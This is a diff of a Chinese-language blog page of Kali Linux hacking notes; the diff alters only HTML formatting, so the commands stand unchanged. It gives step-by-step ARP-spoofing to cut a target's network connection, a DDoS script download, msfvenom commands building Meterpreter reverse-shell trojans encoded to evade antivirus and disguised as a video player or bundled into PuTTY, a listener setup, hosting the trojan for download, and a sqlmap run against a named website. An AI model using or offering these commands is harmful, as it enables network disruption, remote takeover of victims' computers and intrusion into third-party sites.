@@ -308,24 +308,24 @@
 <p>一句话解释： 断网攻击用使用ARPspoof工具，欺骗设备，截断网关和被攻击主机之间的正常通信</p>
 <p>请勿用于违法用途！</p>
 <p>首先进入root用户<br>执行命令，然后输入你装系统的时候的密码，然后按Enter键</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure></div>
 
 <p>使用ipconfig查看自己网卡名称和网关。<br>例如我的网卡叫eth0。注意不要选错了，笔记本电脑有无线网卡和有线网卡，有线网卡一般叫eth0，有线网卡一般叫lo之类的名字。确认好你正在用什么方式联网，是网线还是WiFi，WiFi就是无线网卡，插网线就是有线网卡</p>
 <p>查看网关，你和被攻击主机在同一个网络下，所以你的网关和被攻击主机的网关是一样的</p>
 <p>其实如果你能看到路由器的话，也可以直接去看路由器管理页面的网址，一般是192.168.0.1，这个网址就是网关地址</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></div>
 
 <p>使用nmap工具扫描设备<br>查看被攻击主机的IP地址，然后稍等片刻，扫描结果就会出来，命令格式是这样的：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 你网关IP地址-200</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 你网关IP地址-200</span><br></pre></td></tr></table></figure></div>
 
 <p>比如我的网关是192.168.0.1 ，我的命令应该这样写</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.1-200</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.1-200</span><br></pre></td></tr></table></figure></div>
 
 <p>然后扫出来一些设备，在这些设备里面找你的攻击目标的IP地址</p>
 <p>图为我的网关，和我电脑的ip地址，被攻击设备的ip我就不展示了。</p>
 <p>你在输出内容里面能看到网关，自己电脑IP，被攻击主机IP</p>
 <p>开始攻击<br>现在开始攻击，命令的格式是这样的，你刚刚已经把被攻击主机ip和网关的ip查好了</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 被攻击主机ip 网关</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 被攻击主机ip 网关</span><br></pre></td></tr></table></figure></div>
 
 <p>例如我想给我边上的笔记本电脑断网，那我就加上它的ip和网关，注意中间有空格</p>
 <p>比如笔记本电脑的IP是192.168.0.102，网关是192.168.0.1</p>
@@ -334,9 +334,9 @@
 <p>ARP攻击可以用于各种设备，我试过家里联网的能远程查看的监控也可以被攻击，亲手断过它的网，因为不喜欢被监视，(<em>^▽^</em>)</p>
 <p>大家家里有没有监控呢？</p>
 <p>如果有问题，欢迎请加入Skype群探讨！<br>————————————————</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br></pre></td></tr></table></figure></div>
 
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/albertensterin/article/details/128510328">https://blog.csdn.net/albertensterin/article/details/128510328</a></p>
+<p>原文链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/albertensterin/article/details/128510328" >https://blog.csdn.net/albertensterin/article/details/128510328<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <h2 id="后续清理"><a href="#后续清理" class="headerlink" title="后续清理"></a>后续清理</h2><p>一旦停止ARP欺骗攻击，网络不会立即恢复正常状态。由于ARP缓存中可能已经存储了虚假的映射关系，因此需要一定时间才能够自动清除这些错误的ARP条目并重新建立正确的映射。</p>
 <p>在某些情况下，受影响的主机可能需要等待一段时间才能够恢复到正常状态。但通常情况下，网络会随着时间的推移逐渐恢复正常。如果需要更快地恢复网络状态，可以尝试执行以下操作：</p>
 <ol>
@@ -346,107 +346,107 @@
 <p>在进行安全测试时，请务必小心谨慎，并且确保拥有适当的授权。</p>
 <p>清除ARP缓存可以通过以下方法进行：</p>
 <p>在Windows上，可以打开命令提示符并执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -d \*</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -d \*</span><br></pre></td></tr></table></figure></div>
 
 <p>这将删除系统中所有已知的ARP条目。</p>
 <p>在Linux上，可以打开终端并以root权限执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip neigh flush all</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip neigh flush all</span><br></pre></td></tr></table></figure></div>
 
 <p>这将清除系统中所有的邻居（包括ARP）缓存。</p>
 <p>请注意，在执行这些命令时，可能会导致一些网络连接中断，因此请谨慎操作。</p>
 <h2 id="快速复制"><a href="#快速复制" class="headerlink" title="快速复制"></a>快速复制</h2><p>shenglang</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.2.35 192.168.2.1</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.2.35 192.168.2.1</span><br></pre></td></tr></table></figure></div>
 
 <p>使用nmap 可以扫描端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ip]</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ip]</span><br></pre></td></tr></table></figure></div>
 
 <p>使用nmap -o 查询主机系统信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -o [ip]</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -o [ip]</span><br></pre></td></tr></table></figure></div>
 
 <p>查询网关</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP [ip]</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP [ip]</span><br></pre></td></tr></table></figure></div>
 
 <p>扫描当前子网下的所有存活主机 比如你的ip是192.168.2.21 你想要扫描你这个网络下的所有Ip你可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.2.0/24</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.2.0/24</span><br></pre></td></tr></table></figure></div>
 
 <p>34 35 37 38 39 40 43 46 53 64 36</p>
 <p>192.168.2.34</p>
 <p>192.168.2.39 是一个存活主机 win10</p>
 <p>arpspoof -i eth0 -t 192.168.2.37 192.168.2.1</p>
 <h2 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h2><p>我已经提前再kali下载了脚本所以直接进入 ddos 文件夹内 使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ddos-p3.py</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ddos-p3.py</span><br></pre></td></tr></table></figure></div>
 
 <p>如果没有下载可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Andysun06/ddos</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Andysun06/ddos</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a>远控木马</h2><p>msfvenom</p>
-<p>链接:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/11756544.html">https://www.cnblogs.com/Cl0ud/p/11756544.html</a></p>
+<p>链接:<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/11756544.html" >https://www.cnblogs.com/Cl0ud/p/11756544.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>生成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure></div>
 
 <p>LHOST就是你kali的ip地址，LPORT就是想要让kali监听用哪一个端口来监听这个shell，然后将这个生成的exe文件输出到当前目录下Cl0ud.exe</p>
 <p>比如</p>
 <p>开启metasploit框架</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></div>
 
 <p>生成木马 msf5的生成代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -f exe &gt; ./Cl0ud.exe</span><br></pre></td></tr></table></figure></div>
 
 <p>msf6:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter\_reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter\_reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>
 
 <p>不容易被免杀的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -b &quot;\x00&quot; -e x64/xor\_dynamic -i 10 -f exe -o /var/www/html/西瓜影音.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -b &quot;\x00&quot; -e x64/xor\_dynamic -i 10 -f exe -o /var/www/html/西瓜影音.exe</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</span><br></pre></td></tr></table></figure></div>
 
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53030229/article/details/116751107">https://blog.csdn.net/qq_53030229/article/details/116751107</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse\_tcp</span><br></pre></td></tr></table></figure>
+<p>原文链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53030229/article/details/116751107" >https://blog.csdn.net/qq_53030229/article/details/116751107<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse\_tcp</span><br></pre></td></tr></table></figure></div>
 
 <p>监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="生成针对win10的反弹shell"><a href="#生成针对win10的反弹shell" class="headerlink" title="生成针对win10的反弹shell"></a>生成针对win10的反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.2.36 lport=1234 -f exe &gt;jiami.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这个解释一下</span><br><span class="line">msfvenom 生成木马</span><br><span class="line">-p 这个的意思是 payload，意思是攻击载荷，简单的说，生成怎么样的攻击模块</span><br><span class="line">windows不用解释了吧</span><br><span class="line">meterpreter/reverse\_tcp 反弹shell的意思，就是提权的意思</span><br><span class="line">lhost=本地IP</span><br><span class="line">lport=本地端口</span><br><span class="line">-f 输出格式 例如苹果的MAC你就要输出的是dmg的格式</span><br><span class="line">exe是windows的软件方式</span><br><span class="line">&gt;muma.exe 生成软件为muma.exe</span><br></pre></td></tr></table></figure>
+<h2 id="生成针对win10的反弹shell"><a href="#生成针对win10的反弹shell" class="headerlink" title="生成针对win10的反弹shell"></a>生成针对win10的反弹shell</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.2.36 lport=1234 -f exe &gt;jiami.exe</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这个解释一下</span><br><span class="line">msfvenom 生成木马</span><br><span class="line">-p 这个的意思是 payload，意思是攻击载荷，简单的说，生成怎么样的攻击模块</span><br><span class="line">windows不用解释了吧</span><br><span class="line">meterpreter/reverse\_tcp 反弹shell的意思，就是提权的意思</span><br><span class="line">lhost=本地IP</span><br><span class="line">lport=本地端口</span><br><span class="line">-f 输出格式 例如苹果的MAC你就要输出的是dmg的格式</span><br><span class="line">exe是windows的软件方式</span><br><span class="line">&gt;muma.exe 生成软件为muma.exe</span><br></pre></td></tr></table></figure></div>
 
 <p>木马放到apache下，然后windows才能访问才能下载</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp muma.exe /var/www/html/</span><br><span class="line">把这个复制到网站服务器下面去</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp muma.exe /var/www/html/</span><br><span class="line">把这个复制到网站服务器下面去</span><br></pre></td></tr></table></figure></div>
 
 <p>如果需要生成shellCode可以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.2.44 lport=4444 --encrypt base64 -f c</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.2.44 lport=4444 --encrypt base64 -f c</span><br></pre></td></tr></table></figure></div>
 
 <p>运行监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse\_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.2.44</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse\_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.2.44</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 1234</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></div>
 
 <p>开始网站服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure></div>
 
 <p>关闭网站服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></table></figure></div>
 
 <p>这时候再同一网络的浏览器访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.44/hello.exe</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.44/hello.exe</span><br></pre></td></tr></table></figure></div>
 
 <p>就可以自动下载，由于没有免杀所以会被排除</p>
 <h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p><strong>1、查看ssh状态</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status</span><br></pre></td></tr></table></figure></div>
 
 <p><strong>2、重启、开启、关闭ssh</strong></p>
 <p>重启ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure></div>
 
 <p>开启ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure></div>
 
 <p>关闭ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh stop</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh stop</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="msf自捆绑编码"><a href="#msf自捆绑编码" class="headerlink" title="msf自捆绑编码"></a>msf自捆绑编码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -e x86/shikata\_ga\_nai -x putty.exe -i 15 -f exe -o pentest4.exe</span><br></pre></td></tr></table></figure>
+<h2 id="msf自捆绑编码"><a href="#msf自捆绑编码" class="headerlink" title="msf自捆绑编码"></a>msf自捆绑编码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.2.36 LPORT=1234 -e x86/shikata\_ga\_nai -x putty.exe -i 15 -f exe -o pentest4.exe</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="查看磁盘情况"><a href="#查看磁盘情况" class="headerlink" title="查看磁盘情况"></a>查看磁盘情况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
+<h2 id="查看磁盘情况"><a href="#查看磁盘情况" class="headerlink" title="查看磁盘情况"></a>查看磁盘情况</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><h2 id="slqmap"><a href="#slqmap" class="headerlink" title="slqmap"></a>slqmap</h2><p>当程序有防get注入的时候，可以使用cookie注入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.bjxhyn.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc\_hash=?id=1&quot;</span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.bjxhyn.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc\_hash=?id=1&quot;</span><br></pre></td></tr></table></figure></div>
 		</div>
 
 		
